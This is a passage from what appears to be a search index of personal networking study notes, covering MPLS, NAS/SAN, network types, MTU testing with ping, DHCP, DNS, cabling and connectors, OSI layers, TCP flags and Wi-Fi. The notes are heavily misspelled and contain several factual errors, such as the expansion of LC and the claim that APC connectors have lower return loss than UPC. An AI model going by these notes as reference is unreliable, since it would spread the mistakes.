</li> <li> <p>We send data to the clostes provider edge router</p> </li> <li>Edge router insert an lable into this data (pushing)</li> <li>Then knows how internals of a provider switch network  </li> <li>When the data reaches the end the lable is beeing removed (popped     off)</li> <li>Data is send to the customer edge router</li> </ul> <p>{{mGRE}}</p>"},{"location":"docs/Network/Data/NAS/","title":"NAS","text":""},{"location":"docs/Network/Data/NAS/#network-attached-storage","title":"Network Attached Storage","text":"<p>Contains multiple drives and store large amounts of data - Connect to a shared stroage device across the network - File-level access! Changes to one bait of data result in overwrite of an entaire disc - Requaiers a lot of bandwidth May use an isolated network And high speed network tech</p> <p>SAN iSCSI</p>"},{"location":"docs/Network/Data/SAN/","title":"SAN","text":""},{"location":"docs/Network/Data/SAN/#storage-area-network","title":"Storage Area Network","text":"<ul> <li>Looks like a local storage device<ul> <li>Block-level access<ul> <li>Very efficient reading and writing<ul> <li>If u want to change a small peace of the file u don\u2019t     have to overwrite the entire file</li> </ul> </li> </ul> </li> </ul> </li> <li>Requiters a lot of bandwidth May use an     isolated network And high speed network tech</li> </ul> <p>[!quote] NAS Fibre_chanel iSCSI</p>"},{"location":"docs/Network/Data/mGRE/","title":"Multipoint Generic Router Encapsualtion","text":"<ul> <li>Used extensivly for     DMVPNM</li> <li>Common on [[Cisco routesrs]] mGre_Visual.png     ## VPN builds itself</li> <li>Tunnels are built dynamically on demand They are considered to     be Mesh</li> <li>Remote sites taht communicate to each other</li> <li>They are removed when no longere needed</li> </ul> <p>{{VPN}} {{DMVPNM}} {{MPLS}}</p>"},{"location":"docs/Network/Data/Data_ref/DMVPNM/","title":"DMVPNM","text":""},{"location":"docs/Network/Data/Data_ref/DMVPNM/#dynamic-multipoint-vpn","title":"Dynamic Multipoint VPN","text":""},{"location":"docs/Network/Network_Types/CAN/","title":"CAN","text":""},{"location":"docs/Network/Network_Types/CAN/#campus-area-network","title":"Campus Area Network","text":""},{"location":"docs/Network/Network_Types/CAN/#alt-name-corporate-area-network-a-middle-ground-betwwen-lan","title":"alt-name Corporate Area Network *A middle ground betwwen [LAN]","text":"<p>and [MAN]*</p> <ul> <li>Limited geographical area<ul> <li>A group of buildings like campus</li> </ul> </li> <li>Lan Technolgoies<ul> <li>Fiber connected(from one building to another)</li> <li>High speed Ethernet</li> </ul> </li> <li>Ussualy No third-party providers     -U-put-your-own-fiber-to-the-ground</li> </ul>"},{"location":"docs/Network/Network_Types/Client-server/","title":"Client-server","text":"<ul> <li>Central server<ul> <li>Clients talk to the server<ul> <li>!!NO     client-to-client-comunication!!</li> </ul> </li> <li>Good Performence and Administaration</li> <li>However its complex and quite costly (Server ,Data , Admin     cost) &gt;</li> </ul> </li> </ul>"},{"location":"docs/Network/Network_Types/LAN/","title":"alt-name Local Area Network ## Local is relative","text":"<ul> <li>Network within the single building or groups of buildings<ul> <li>All of resoruces are avaible in the building</li> <li>The network using is in the same building as u are (Home     Scenario)</li> </ul> </li> <li>Hig speed connectivity</li> <li>Ethernet and 802.11     wireless network<ul> <li>Any slower is not \u201cLocal\u201d</li> </ul> </li> </ul>"},{"location":"docs/Network/Network_Types/MAN/","title":"MAN","text":""},{"location":"docs/Network/Network_Types/MAN/#metropolitan-area-network","title":"Metropolitan Area Network","text":"<ul> <li>Larger then LAN smaller     then WAN</li> </ul>"},{"location":"docs/Network/Network_Types/MTU/","title":"Constant","text":"<p>Maximum Transmission Unit (MTU)</p> <p>Definition: Size of the data that can be sent through the network without being fragmented.</p>"},{"location":"docs/Network/Network_Types/MTU/#mtu-size-configuration","title":"MTU Size Configuration","text":"<ul> <li>MTU sizes are usually configured once. Based on the network     infrastructure, it does not change often.</li> </ul>"},{"location":"docs/Network/Network_Types/MTU/#challenges-with-mtu-discovery","title":"Challenges with MTU Discovery","text":"<ul> <li>Automated methods are inaccurate.</li> <li>Especially when ICMP Protocol is     filtered.</li> </ul>"},{"location":"docs/Network/Network_Types/MTU/#significant-concern-for-tunneled-traffic-vpn","title":"Significant Concern for Tunneled Traffic (VPN)","text":"<p>The tunnel might be smaller than your local Ethernet segment.</p>"},{"location":"docs/Network/Network_Types/MTU/#what-if-you-send-data-too-large-with-df-set","title":"What If You Send Data Too Large with DF Set?","text":"<p>DF = Don\u2019t Fragment - Routers will respond back and tell you to fragment the data. - You need to receive ICMP Protocol message (data is too large to send).</p>"},{"location":"docs/Network/Network_Types/MTU/#check-whether-data-is-too-large","title":"Check Whether Data Is Too Large","text":"<ul> <li>Troubleshoot using ping Command<ul> <li> <p>Ping with DF forces a particular size of data:</p> <ul> <li> <p>1500 bytes - 8 bytes ICMP     Protocol header - 20 bytes     IP = 1472</p> </li> <li> <p>Windows:</p> <pre><code>ping -f -l 1472 8.8.8.8\n</code></pre> </li> <li> <p>macOS and Linux:</p> <pre><code>ping -D -s 1472 8.8.8.8\n</code></pre> </li> </ul> </li> </ul> </li> </ul> <p>Bandwidth Ifconfig</p>"},{"location":"docs/Network/Network_Types/Metro-E/","title":"Metro-E","text":""},{"location":"docs/Network/Network_Types/Metro-E/#metro-ethernet","title":"Metro Ethernet","text":""},{"location":"docs/Network/Network_Types/Metro-E/#alt-name-metropolitian-area-network-a-contained-regional-area","title":"alt-name Metropolitian -area network - A contained regional area","text":"<p>Connect your sites with Ethernet - A coomand Stand The provider network is optical - Local Fiber network - Wavelenght-division mulltiplexing - High speed , multiple wavelenghst of light</p>"},{"location":"docs/Network/Network_Types/PAN/","title":"Personal Area Network","text":"<ul> <li>YOur own private network<ul> <li>Bluetooth,IR,NFC</li> <li>Automobile<ul> <li>audio output</li> <li>integrate with phone</li> </ul> </li> <li>Mobile phone<ul> <li>Wireless headset</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Network/Network_Types/PDU/","title":"PDU","text":"<pre><code># Protocol Data\n</code></pre>"},{"location":"docs/Network/Network_Types/PDU/#alt-name-transmission-units-were-taking-a-little-bit-of-data-and","title":"alt-name Transmission units *were taking a little bit of data and","text":"<p>transfering it across the network as a single unit ## Examples - Ethernet - Operates on a frame of data * It doesn\u2019t care what\u2019s inside! * IP * Operates on a packet of data * Does not care what\u2019s inside!* * Ip contains UDP or TCP or diff protocol</p> <p>If the data unit contains a header it will contatain: TCP segment or UDP datagram</p>"},{"location":"docs/Network/Network_Types/PDU/#encapsilation-and-decapsulation-of","title":"Encapsilation and Decapsulation of","text":"<p>Encapsilation_Decapsulation_visual.png</p>"},{"location":"docs/Network/Network_Types/PDU/#flags","title":"Flags","text":"<ul> <li>Change how th devica interperets the data beeing send insde     TCP layer Pasted_image_20230319170951.png</li> </ul>"},{"location":"docs/Network/Network_Types/PDU/#we-want-ot-use-mtu-becouse-fragmetation-slow-things-down","title":"We want ot use MTU becouse fragmetation slow things down","text":"<ul> <li>Losing a fragment loses the entire packet</li> <li>Requiers overheard along the path</li> </ul> <p>[!quote] PAR</p>"},{"location":"docs/Network/Network_Types/Peer_to_peer/","title":"Peer to peer","text":"<p>Peer-to-peer_visual.png ## Characters - All devices are both clients and servers Everybody talks to everyone - Easy to deploy Just need an app Low cost - Difficult to adminster and Secure *The auth procces is beeing disribiuted *</p>"},{"location":"docs/Network/Network_Types/SD-WAN/","title":"SD-WAN","text":""},{"location":"docs/Network/Network_Types/SD-WAN/#software-defined-networking","title":"Software Defined Networking","text":"<p>A WAN built for the cloud The data center used to be in one place Cloud has changed everything - Cloud-Based applications communicate directly to the cloud instead of passing thorug a database NowSdWan_visual.png No need to hop thorugh the central point Before that u have to connecte first to the data center - WAN - BeforeSdWan_visual.png</p>"},{"location":"docs/Network/Network_Types/Satelite_networking/","title":"Satelite networking","text":""},{"location":"docs/Network/Network_Types/Satelite_networking/#satelite-networking","title":"Satelite networking","text":"<ul> <li>Communication to a satelite<ul> <li>None-terestrial communication</li> </ul> </li> <li>High costs re;ative to terrestrial networking<ul> <li>50mbit downd 3 mbit up</li> <li>Remote sites difficult ot network sites</li> </ul> </li> <li>High Latency 250 ms up 250     ms down</li> <li>High frequencies 2 GHZ &gt;[!bug] Subject to being absorb by     antything in the way &gt;Aspecialy during Rain Storms</li> </ul>"},{"location":"docs/Network/Network_Types/Virtual_networks/","title":"Virtual networks","text":""},{"location":"docs/Network/Network_Types/Virtual_networks/#virtual-networks","title":"Virtual Networks","text":"<p>Inatily server-farms conatines 100 diffrent coputers that satueted a network </p> <ul> <li>All servers are connected with enterprise switches and routers With     redundancy</li> </ul> <p>Nowadays we create 100 virtual servers inside one device Replacing psychical network devisces with virtual version its called [[NFV]]</p>"},{"location":"docs/Network/Network_Types/WAN/","title":"WAN","text":""},{"location":"docs/Network/Network_Types/WAN/#wide-area-network","title":"Wide Area Network","text":"<ul> <li>Spannin the glob<ul> <li>The larger tne network the slower it gets</li> </ul> </li> <li>Connects LAN across a     distance<ul> <li>Gennerly much slower then LAN     ### WAN technoglogies</li> </ul> </li> <li>[[Point-to-point serial]]     ,MPLS<ul> <li>Terestrial and     non-terestrial connect deeviaces that are so far away     Like Satelites</li> </ul> </li> </ul> <p>{{SD-WAN}}</p>"},{"location":"docs/Network/Network_Types/WLAN/","title":"Wireless LAN","text":"<ul> <li>Mobility<ul> <li>Limited geographical area<ul> <li>Can be expanded with additional Access     Points</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Network/Phisicall/APC_connectors/","title":"APC connectors","text":""},{"location":"docs/Network/Phisicall/APC_connectors/#angle-polished-connectors","title":"Angle-Polished Connectors","text":"<p>Ferrule end faces polished at an eight-degree angle. Lower return loss / higher insertion loss than UPC connector</p> <p>Fiber</p> <p>Cables</p>"},{"location":"docs/Network/Phisicall/BIND/","title":"Berkeley Internet Name Domain","text":"<p>It is used for managing DNS servers and providing DNS services</p> <p>Tip</p> <p>It\u2019s worth knowing that the two can be related in the sense that DNS traffic is often sent over a network using the Internet Protocol (IP), which uses [[MAC Adress]] to identify the source and destination devices. However, this is a lower-level detail that is not directly related to the DNS or BIND software itself.</p>"},{"location":"docs/Network/Phisicall/Bi-Directional_transceivers/","title":"Bi-Directional transceivers","text":"<ul> <li>Traffic in both directions witha a single fiber<ul> <li>Use two diffrent wavelenghts</li> </ul> </li> <li>Reduce the number of fiber runs by half &gt;Example &gt;</li> </ul> <p>Transreciver</p> <p>Duplex Communication</p> <p>Media Converter</p>"},{"location":"docs/Network/Phisicall/CPE/","title":"CPE","text":"<pre><code>## Custommer premieses equmipment\n</code></pre>"},{"location":"docs/Network/Phisicall/CPE/#alt-name-customer-perm-the","title":"alt-name Customer Perm The","text":"<p>place were u connect to do trouble shooting {{NIU}}</p>"},{"location":"docs/Network/Phisicall/Cable_broadband/","title":"Cable Broadband","text":"<ul> <li>Transmition across multiple frequencies</li> <li>Different traffic types(internet teelevision phone etc)</li> <li>Data on the Cables network<ul> <li>Type of connections used by this model is called DOCSIS     (Data Over Cable Service Interfece Specyfication)</li> </ul> </li> <li>High-speed networking<ul> <li>50 Mbits/s through 1,000+ Mbit/s are common</li> </ul> </li> </ul>"},{"location":"docs/Network/Phisicall/Cables/","title":"Cables","text":"<p>[Copper]({{\\&lt; ref \u201cposts/Network/Phisicall/Copper.md\u201d&gt;}})</p> <p>[Structured cabling standards]({{\\&lt; ref \u201cposts/Network/Phisicall/Structured_cabling_standards.md\u201d&gt;}})</p>"},{"location":"docs/Network/Phisicall/Copper/","title":"Copper Cables","text":""},{"location":"docs/Network/Phisicall/Copper/#copper-cables","title":"Copper cables","text":"<ul> <li>Balanced pair operation<ul> <li>Two wires wit equal and opposite signalls</li> <li>Transmi+ Tranismit-/Recive+,Recive-</li> </ul> </li> <li>The twist is the secret<ul> <li>Keeps a single wire constantly moving away from the interfernce</li> <li>The opposite signals are compared on the other end</li> </ul> </li> <li>Extensive installation<ul> <li>Relativly inexpensive</li> <li>Easy to install and maintain</li> </ul> </li> <li>Limited bandwidth     avaliabity<ul> <li>Psychics limits electrical signals through copper</li> </ul> </li> <li>Used in WAN<ul> <li>cable modem DSL</li> </ul> </li> <li>Often comabined with fiber<ul> <li>Copper on the local loop ,fiber in the bacground ## Copper     cable categories     </li> </ul> </li> </ul>"},{"location":"docs/Network/Phisicall/Copper/#coaxial-cables","title":"Coaxial cables","text":"<ul> <li>Two or more forms share a common axis</li> <li>Rg-6 used in televison/digital cable<ul> <li>AND high speed internet over cablee      ##     Twinaxial cable Two inner conductors (Twins)</li> </ul> </li> <li>Common on 10 Gigabit     Ethernet SFP+ cables<ul> <li>full duplex</li> <li>five meters</li> <li>low cost</li> <li>low Latency commpared to     twisted paitr</li> </ul> </li> </ul> <p>[!quote] Fiber [[Structure cabling standartds]]</p>"},{"location":"docs/Network/Phisicall/DHCP_server/","title":"DHCP server","text":""},{"location":"docs/Network/Phisicall/DHCP_server/#dynamic-host-configuration-server","title":"Dynamic Host Configuration Server","text":"<ul> <li>The DHCP assaigns IP address to     all devisces on the subnet     mask<ul> <li>IT keeps all the log files of wich machine is     allocated to which IP     address at anyone time<ul> <li>The DHCP is running in the bacgorund as dhcp dameon</li> </ul> </li> </ul> </li> <li>In oreder to connect from     LAN u must have DHCP     assaigned IP<ul> <li>You can do it by<ul> <li>either restart or</li> <li>by calling DHCP with dhclient and the interface<ul> <li>Note that diffrent distors may have diffrents DHCP     clients &gt;[!example] &gt;kali &gt;dhclient eth0 &gt;&gt;[!tip]-     Whats happening &gt;&gt;The dhclient command sends a     DHCPDISCOVER request from the network interface     specified (here, eth0). It then receives an offer     (DHCPOFFER) from the DHCP server (192.168.181.131 in     this case) and confirms the IP assignment to the DHCP     server with a dhcp request.</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>[!quote] DHCP_protocol Automatic Private IP Addessing</p>"},{"location":"docs/Network/Phisicall/DNS/","title":"DNS","text":""},{"location":"docs/Network/Phisicall/DNS/#domain-name-system","title":"Domain Name System","text":"<p>It translates the domain name such as przegl\u0105d koniski.pl to the aproparite IP addres so the system knows how to get it - Dns could contains the inforamtion about user IP name server (the server that ranslates the target name name to and IP addres) - Dig shows the Dns - ns for name server - mx for mail exchange server &gt; result &gt;</p> <p>Allot of the times its related with BIND</p>"},{"location":"docs/Network/Phisicall/DNS/#distribiuted-database","title":"Distribiuted database","text":"<ul> <li>Many DNS servers</li> <li>13 root server clusters (Over 1000 acttual servers)</li> <li>Hundreds of generic top-level domains (gTLDs)<ul> <li>(.com,.org,*.net)</li> </ul> </li> <li>Over 275 country code top-level domains (ccTLDs)<ul> <li>(.us,.pl,.uk) ## Changing Dns server (resolve.conf)</li> </ul> </li> </ul>"},{"location":"docs/Network/Phisicall/DNS/#etc-in-order-to-do-it-change-the-file-etcresolvconf-on-your","title":"etc In order to do it change the file /etc/resolv.conf on your","text":"<p>systmem - U can check it with the resolvectl</p> <p> &gt;For DHCP server &gt; &gt;If you\u2019re using a DHCP address and the DHCP server provides a DNS setting, the DHCP server will replace the contents of the file when it renews the DHCP address.</p> <p>DNS_Queries</p>"},{"location":"docs/Network/Phisicall/DSL/","title":"DSL","text":""},{"location":"docs/Network/Phisicall/DSL/#_1","title":"DSL","text":"<p>Digital Subscriber Line</p> <p>It is a technology that uses existing telephone lines to provide high-speed Internet access to homes and businesses. DSL works by sending data over the copper Cables that make up the telephone network.</p> <p>It uses a different frequency band than traditional telephone calls, so it can transmit data without interfering with phone service. - Ofthen refered as ADSL #alt-name Asymetric Digital Subscriber Line - It\u2019s name taht way becouse the speed coming to our homes is diffrent then this on telephone lines - Also dowlond speed is faster then the upload speed (Asymetric) - \\~ 3km limitation fot the central office(CO) - 200 Mbit/s downstream /20 Mbits/upstream are common - Faster speeds may be possible if closer to theCO ### Advateges - Can be delivered ove r an existing telephone infrastucture - More affordable then another high-speed options</p>"},{"location":"docs/Network/Phisicall/Demarcation_point/","title":"Demarcation point","text":""},{"location":"docs/Network/Phisicall/Demarcation_point/#the-point-were-u-connect-with-outside-world","title":"The point were u connect with outside world","text":"<ul> <li>WAN provider</li> <li>Internet service provider</li> <li> </li> <li>Used everywhere<ul> <li>Even at home</li> <li>Central location in a building<ul> <li>Usually a netowrk interface device</li> <li>Can be as simple as an RJ-45 connection</li> </ul> </li> </ul> </li> <li>U connect your CPE</li> </ul>"},{"location":"docs/Network/Phisicall/Demarcation_point/#alt-name-demarc","title":"alt-name demarc","text":""},{"location":"docs/Network/Phisicall/Fiber/","title":"Fiber","text":"<p>Fiber is slowly apporching the premmiss</p> <ul> <li>Hig speed communication<ul> <li>Frequencies of the light</li> </ul> </li> <li>Higher installation cost then     Copper<ul> <li>Equipment is more costly</li> <li>More difficult to repair</li> <li>Communicate over long distance</li> </ul> </li> <li>Large insatllation in the     Wan core<ul> <li>Supports very high data rates</li> <li>SONET , wavelenght division multiplexing</li> </ul> </li> </ul> <p>Cables</p>"},{"location":"docs/Network/Phisicall/LC_connector/","title":"LC connector","text":""},{"location":"docs/Network/Phisicall/LC_connector/#local-connetor","title":"Local connetor","text":"<p>Popular becouse u can store alot of them into the router </p> <p>[!quote] Cables</p>"},{"location":"docs/Network/Phisicall/MT-RJ/","title":"MT-RJ","text":""},{"location":"docs/Network/Phisicall/MT-RJ/#mechanical-transfer-registered-jack","title":"Mechanical Transfer Registered Jack","text":"<p>[!quote] Smartjack</p>"},{"location":"docs/Network/Phisicall/NIU/","title":"NIU","text":""},{"location":"docs/Network/Phisicall/NIU/#network-interface-unit","title":"Network interface unit","text":"<ul> <li>Device taht determines the Demarcation     point(Demarc)<ul> <li>DemarcPoint_visual.png</li> </ul> </li> <li>Network Interface Device</li> <li>Telephone Network Interface</li> </ul> <p>It\u2019s coommon for network prvoiders to use Smartjack {{Physical_OSI}}</p>"},{"location":"docs/Network/Phisicall/Return_Loss/","title":"Return Loss","text":""},{"location":"docs/Network/Phisicall/Return_Loss/#constant-return-loss","title":"#Constant Return loss","text":"<ul> <li>Light reflected back to the cource To maximalize the return loos we     use UPC connector or     APC connectors</li> <li></li> </ul> <p>[!quote]</p>"},{"location":"docs/Network/Phisicall/SC_connector/","title":"SC connector","text":""},{"location":"docs/Network/Phisicall/SC_connector/#subscriber-connectors","title":"Subscriber connectors","text":"<p>[!quote] St connectorLC connector</p>"},{"location":"docs/Network/Phisicall/Smartjack/","title":"Smartjack","text":""},{"location":"docs/Network/Phisicall/Smartjack/#smart-jack","title":"Smart Jack","text":"<p>Power system that is able to detrmeinted whats the issue it\u2019s a remote monitroingf of the network</p> <ul> <li>More then just a simple interface</li> <li>Can be a circut card in a chassis (alot of bliking lights and     status lights with limmited acces becouse its the property of a     network provider) {{Physical_OSI}} {{CPE}}</li> </ul>"},{"location":"docs/Network/Phisicall/St_connector/","title":"St connector","text":""},{"location":"docs/Network/Phisicall/St_connector/#sraight-tip","title":"Sraight Tip","text":"<p>U have o untwist before removing</p> <p>[!quote][St connector](../../../Network/Phisicall/St_connector)[[SC connector ]]</p>"},{"location":"docs/Network/Phisicall/Structured_cabling_standards/","title":"Structured cabling standards","text":""},{"location":"docs/Network/Phisicall/Structured_cabling_standards/#structure-cabling-standartds","title":"Structure cabling standartds","text":"<ul> <li>International ISO/IEC 11801 cablin standards<ul> <li>Defines classes of networking standards</li> </ul> </li> <li>Telecomunnication Industry Association (Tia)<ul> <li>Standards marke analysius trade shows government affairs</li> <li>ANSI/TIA-568 Commericail Bulding Telocomunications Cabling     Standards</li> <li>Commonoly refernced for a pin and pair assagmets of     eight-conductor 100-ohm balanced twisted pair cablinbg<ul> <li>T5668A and T568B     Cables</li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Network/Phisicall/UPC_connector/","title":"UPC connector","text":""},{"location":"docs/Network/Phisicall/UPC_connector/#ultra-polished-connectors","title":"Ultra-polished connectors","text":"<ul> <li>Fereule end-face radius polished data a zero degree angle</li> <li>High Return Loss</li> </ul> <p>[!quote] Fiber Cables</p>"},{"location":"docs/Network/Phisicall/bandwidth/","title":"Definiton - *The maximum amount of data that can be transmitted over a","text":"<p>network connection in a given amount of time.*</p> <pre><code>- It is typically measured in bits per second (bps)\n</code></pre> <p>or a multiple thereof, such as kilobits per second (Kbps), megabits per second (Mbps), or gigabits per second (Gbps).</p> <p>HTTPS HTTP</p> <p>Nagle\u2019s_Algorithm</p>"},{"location":"docs/Network/Phisicall/duplex_communication/","title":"duplex communication","text":""},{"location":"docs/Network/Phisicall/duplex_communication/#duplex-communication","title":"Duplex communication","text":"<p>Two fibers transmit and recive </p>"},{"location":"docs/Network/Phisicall/duplex_communication/#duplex-transceiver","title":"Duplex transceiver","text":"<p>The alternative to it is Bi-Directional transceivers &gt;[!quote] Physical_OSI</p>"},{"location":"docs/Network/Phisicall/media_converter/","title":"media converter","text":""},{"location":"docs/Network/Phisicall/media_converter/#signal-converter","title":"Signal converter","text":"<ul> <li>Device that allows to connect     Fiberconnection with     Copperconnections and     another way around<ul> <li>Extendent the a coppper wire over a long distance</li> <li>The switch has only copper     ports </li> </ul> </li> </ul> <p>[!quote] Physical_OSI transceiver</p>"},{"location":"docs/Network/Phisicall/transceiver/","title":"transceiver","text":""},{"location":"docs/Network/Phisicall/transceiver/#transceiver","title":"transceiver","text":"<ul> <li>Both Transsmiter and Reciver<ul> <li>Ussualy in a single component</li> </ul> </li> <li>Provides a modular interface<ul> <li>Add the transivers that match ure network</li> </ul> </li> <li>They work in duplex     communication</li> <li>Many diffrenjt types and designs<ul> <li>Remember to chec the documentation becouse diffrent devices     need diffrent transivers</li> </ul> </li> </ul> <p>[!quote] Physical_OSI media converter</p>"},{"location":"docs/Network/Ref_OSI/Application_OSI/","title":"Application Layer OSI","text":"<p>The layer we see ## Functions - Habndaling 1. HTTP 2. FTP 3. DNS <code>53</code> 4. POP3</p>"},{"location":"docs/Network/Ref_OSI/Application_OSI/#common-devices-layer-7","title":"Common devices [Layer 7","text":"<p>Firewalls](../../../Network/Ref_OSI/L7_FireWalls) - <code>WAF</code> Web application Firewall - <code>Reverse Proxies</code> Load Balancers - <code>Next Gen Firewalls</code> Load Balancers</p> <p>OSI Model</p>"},{"location":"docs/Network/Ref_OSI/Bus/","title":"Bus","text":"<p> - Early local area networks - Simple but prone to errors</p> <pre><code>&gt;Bug\n&gt;\n&gt;- **!!One break in the  link disables the entire network**!!\n</code></pre>"},{"location":"docs/Network/Ref_OSI/DataLink_OSI/","title":"def The basic network <p>language #alt-name The switching layer The foundation of communication - Data Link Control[DLC] protcols - Mac(Media Acess Control)adress on the Ethernet</p> <pre><code>    - [[Mac_visual].png]]\n</code></pre>","text":""},{"location":"docs/Network/Ref_OSI/Ethernet/","title":"Ethernet","text":"<pre><code>## Ethernet\n</code></pre> <p>The most popular networking toll</p> <ul> <li>Modern Ethernet uses<ul> <li>Fiber</li> <li>Copper</li> </ul> </li> <li>BASE (baseband)<ul> <li>single frequency using the entire medium</li> <li>Cable     broadband using     many frequencies ,sharing the medium</li> </ul> </li> </ul>"},{"location":"docs/Network/Ref_OSI/IP/","title":"IP","text":""},{"location":"docs/Network/Ref_OSI/IP/#the-ethernet-protocol","title":"The ethernet protocol","text":"<p>The MTU of ip is 1500 bytes! ## IP Flags they deal with the fragmentation of data</p>"},{"location":"docs/Network/Ref_OSI/IP/#ip-fragmentation","title":"IP fragmentation","text":"<p>Fragments are always in multiples of 8 becouse of the number of fragmentation offsets bits in the IP header</p>"},{"location":"docs/Network/Ref_OSI/IP/#holding-data","title":"Holding data","text":"<p>The data is beeing hold im the TCP UDP</p>"},{"location":"docs/Network/Ref_OSI/IP/#transfering-data","title":"Transfering data","text":"<p>The data ins Encapsulated by the IP protocol - Ethernet frame &gt;</p>"},{"location":"docs/Network/Ref_OSI/L7_FireWalls/","title":"Layer 7 Firewalls","text":""},{"location":"docs/Network/Ref_OSI/L7_FireWalls/#unified-threat-menagmentutm","title":"Unified threat menagment(UTM)","text":"<p>Multiple layers of seciruty appliance Article</p>"},{"location":"docs/Network/Ref_OSI/L7_FireWalls/#next-generation-firewalls-ngfw","title":"Next generation FireWalls (NGFW)","text":"<ul> <li>Aware of what the app is doing<ul> <li>Aware of headers</li> </ul> </li> <li>Cand adapt to various apps, users, devices<ul> <li>Look for the <code>embrionic</code>connecitons(half open)</li> </ul> </li> </ul>"},{"location":"docs/Network/Ref_OSI/L7_FireWalls/#web-application-firewalls-wafs","title":"Web Application Firewalls (wafs)","text":"<p>Docs AWS WAF - Are aware of the <code>OWSAP</code> top 10 and prevent those attacks natively - Apploed by Cloud Providers in front of diffrent applications</p> <p>Layer 7 Application</p>"},{"location":"docs/Network/Ref_OSI/Mesh/","title":"Mesh","text":""},{"location":"docs/Network/Ref_OSI/Mesh/#mesh","title":"Mesh","text":"<p>MeshTopology_visual.png - Bot Fully connected Partially connacted - Redundancy fault-tolernace load balancing - Used in WAN Wide area network - Both Fully and Partially Meshed</p>"},{"location":"docs/Network/Ref_OSI/Network_OSI/","title":"Network OSI","text":"<pre><code>#def &lt;mark style=\"background: #FFB86CA6;\"&gt;The \"routing\" layer&lt;/mark&gt;\n</code></pre> <ul> <li>Layer assosiated with IP adress</li> <li>Fragments frames to traverse diffrent networks</li> </ul>"},{"location":"docs/Network/Ref_OSI/Physical_OSI/","title":"Physical OSI","text":"<pre><code>#def *The physics of the network*\n</code></pre>"},{"location":"docs/Network/Ref_OSI/Physical_OSI/#compononents","title":"Compononents","text":"<ul> <li>Signaling, Cabling, Connectors<ul> <li>punch downs (Punchdowns are a type of termination method used     to connect network cables to a patch panel or wall jack. The     term \u201cpunchdown\u201d comes from the process of pushing down on the     wires with a specialized tool to make a secure connection.)</li> </ul> </li> </ul>"},{"location":"docs/Network/Ref_OSI/Physical_OSI/#methods","title":"Methods","text":"<ul> <li>Fix your cabling (punchdown etc)</li> <li>Run loopback test A loopback test is a diagnostic test that is     performed to check the functionality of a network interface card     ([[NIC]] or other networking hardware by sending data from the     device back to itself.</li> <li>reaplace adapter</li> <li>swap adapeter cards</li> </ul>"},{"location":"docs/Network/Ref_OSI/Presentation_OSI/","title":"Presentation OSI","text":"<pre><code>#def &lt;mark style=\"background: #FFB86CA6;\"&gt;Puts data in readable format&lt;/mark&gt;\n</code></pre>"},{"location":"docs/Network/Ref_OSI/Presentation_OSI/#functions","title":"Functions","text":"<ul> <li>Character encoding\u2019</li> <li>Application encryption side note often combined with     Application_OSI</li> </ul>"},{"location":"docs/Network/Ref_OSI/Ring/","title":"Ring","text":""},{"location":"docs/Network/Ref_OSI/Ring/#ring","title":"Ring","text":"<p>RingTopology_visual.png * Used for wide area networks - MANMetro area networks - WAN Wide area Networks Traffic ussaly go in the circle  ### What if a device is unabel to transfer data - Built in fault tolerance If a device is unable to send data the other devices will go to as far as it can and loop back to go to the other side</p>"},{"location":"docs/Network/Ref_OSI/Session_OSI/","title":"Functions","text":"<ul> <li>Communications between devices<ul> <li>Start, Stop, Restart</li> </ul> </li> <li>Control protocols, Tunneling protocols</li> </ul>"},{"location":"docs/Network/Ref_OSI/Star/","title":"Star","text":""},{"location":"docs/Network/Ref_OSI/Star/#star","title":"Star","text":""},{"location":"docs/Network/Ref_OSI/Star/#alt-name-hub-and-spoke","title":"alt-name Hub and Spoke","text":"<p>StartTopol_visual.png - Used in most large and smal networks - All devices are connected to the central device - Switched Ethernet network The swich is in the middle</p>"},{"location":"docs/Network/Ref_OSI/TCP/","title":"TCP","text":"<pre><code>#alt-name streaming protocol\n</code></pre>"},{"location":"docs/Network/Ref_OSI/TCP/#transmission-control-protocol","title":"Transmission Control Protocol","text":"<p>It makes sure that data is transmmited in reaiable way</p> <p>PAR - TCP is a connection base system  - U have to establisch the connetion with the device to send the packet - Ordering - Tcp headers contains sequence numbers so if the data get out of order during the transportation - If the packet is missing we can request for the lost one - Flow Control - The reciver can manage how much data is sent ## Flags</p> Flag Usage URG(urgent) Packet to be proccesed immidiatly PSH(Push) Transmits data immidiatly FIN(Finish) No further transmition ACK(Acknowladgement) Acknowladges recepit of the packet SYN(Synchronization) Initialaizes connection between hos and target RST(Resets) Resets the connection <p>[!quote] 3-way Handshake Port Scanning Nagle\u2019s Algorithm</p>"},{"location":"docs/Network/Ref_OSI/Transport_OSI/","title":"Transport OSI","text":"<pre><code>#def Describes how data is being delivered and where is being deliverd on the system\n</code></pre>"},{"location":"docs/Network/Ref_OSI/Transport_OSI/#alt-name-postoffice-this-protocols-are-used-when-the-data-is-to-large","title":"alt-name PostOffice This protocols are used when the data is to large","text":"<p>and\u2019 has to be devided into smaller pieces - TCP(Transmition Control Protocol) - UDP (USer Datagram Protocol) &gt;[!quote] &gt;bandwidth,MTU</p>"},{"location":"docs/Network/Ref_OSI/access_point/","title":"Definition: A device that provides hosts access to a computer network","text":"<p>using a wireless transmission medium, which is radio waves.</p> <p>An access point is typically a bridge connecting a wireless local area network (WLAN) with a local area network (LAN).</p>"},{"location":"docs/Network/WI-FI/Wi-Fi/","title":"Wi-Fi Networks","text":""},{"location":"docs/Network/WI-FI/Wi-Fi/#access-point","title":"access point","text":"<p>chanels_wi-fi</p> modes_wi-fi security_wi-fi <p>frequency_wi-fi</p> <p>nmcli</p>"},{"location":"docs/Network/WI-FI/chanels_wi-fi/","title":"Wi-Fi channels","text":"<ul> <li>Wi-Fi can operate on any one of 14 channels (1\u201314)<ul> <li>In theUnited States, Wi-Fi is limited to channels 1\u201311</li> </ul> </li> </ul>"},{"location":"docs/Network/WI-FI/frequency_wi-fi/","title":"Wi-Fi frequency","text":"<ul> <li>Wi-Fi is designed to operate on 2.4GHz and 5GHz<ul> <li>Modern Wi-Fi APs and wireless network cards often use both</li> </ul> </li> </ul>"},{"location":"docs/Network/WI-FI/iwlist/","title":"iwlist","text":""},{"location":"docs/Network/WI-FI/iwlist/#iwlist","title":"Iwlist","text":"<p>To see Wi-Fi access point &gt;[!example]- iwlist interface action &gt;</p> <p>[!quote] ifconfig | iwconfig</p>"},{"location":"docs/Network/WI-FI/managed_mode_wi-fi/","title":"managed 